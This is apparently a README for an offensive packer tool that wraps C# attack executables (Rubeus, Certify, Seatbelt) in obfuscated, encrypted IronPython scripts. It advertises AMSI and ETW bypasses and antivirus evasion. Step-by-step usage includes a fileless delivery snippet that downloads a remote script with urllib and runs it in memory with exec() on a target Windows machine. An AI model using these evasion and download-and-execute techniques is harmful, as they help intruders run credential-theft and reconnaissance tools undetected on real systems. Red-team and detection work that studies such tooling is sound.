### Invoke-Python-SharpPacker.py
--------------------------------------
'Invoke-Python-SharpPacker' allows to pack offensive C# .NET executables to bypass AV solutions such as Windows Defender.  
It generates obfuscated Python scripts, designed to run with IronPython (https://ironpython.net/), embedding a compressed and encrypted version of the offensive C# .NET payloads (exe) for stealthy execution via reflective code loading in-memory.  

<i/>Note: this an improved version of the cool project 'IronSharpPack'</i>

#### FEATURES
  - AMSI bypass
  - ETW bypass
  - XOR encryption
  - Reflective C# code loading in-memory
  - Obfuscation, compression (Zlib) and encoding (Base64)

#### USAGE
  - STEP 1. Compile and then copy in the same directory all the offensive C# .NET executables that you want to pack (e.g. Rubeus.exe, Certify.exe, Seatbelt.exe) 
    
  - STEP 2. Download the latest version of IronPython 3.4.2 (https://ironpython.net/) and copy the script 'Invoke-Python-SharpPacker.py' in the IronPython 3.4.2 folder 'Net462'
    
  - STEP 3. Generate obfuscated Python scripts that embed an encrypted version of the (C#) .NET executable files.  
```
C:\path\IronPython.3.4.2\Net462> ipy.exe Invoke-Python-SharpPacker.py "C:\path-to-folder-containing-C#-exe-to-pack"   

Note: the packed python scripts will be created in the folder "C:\path\IronPython.3.4.2\Net462"
```
  - STEP 4. Download or copy the latest version of IronPython 3.4.2 on a target Windows machine.

  - STEP 5. Download from a remote web server and execute directly in memory the obfuscated Python scripts on the target Windows machine using IronPython. 
      - This fileless delivery technique enhances stealth and helps evade static antivirus detection.
      - With AMSI and ETW patched, in-memory execution avoids runtime AV detection.
```
Example:
--------
C:\temp\IronPython.3.4.2\Net462> type .\Python-fileless-delivery.py

#Python3
import urllib.request
request = urllib.request.Request('http://website/Packed-Python-Script-Seatbelt.py')
result = urllib.request.urlopen(request)
payload = result.read()
exec(payload)

C:\path\IronPython.3.4.2\Net462> ipy.exe .\Python-fileless-delivery.py  "AMSIProviders"

```
   - Alternatively, you may download and store the obfuscated Python scripts locally on disk prior to execution with IronPython. The obfuscation and encryption help evade static analysis by most antivirus solutions, though this method may offer reduced stealth compared to in-memory execution.
```
Example:
--------
C:\temp\IronPython.3.4.2\Net462> ipy.exe .\Packed-Python-Script-Seatbelt.py  "AMSIProviders"
```
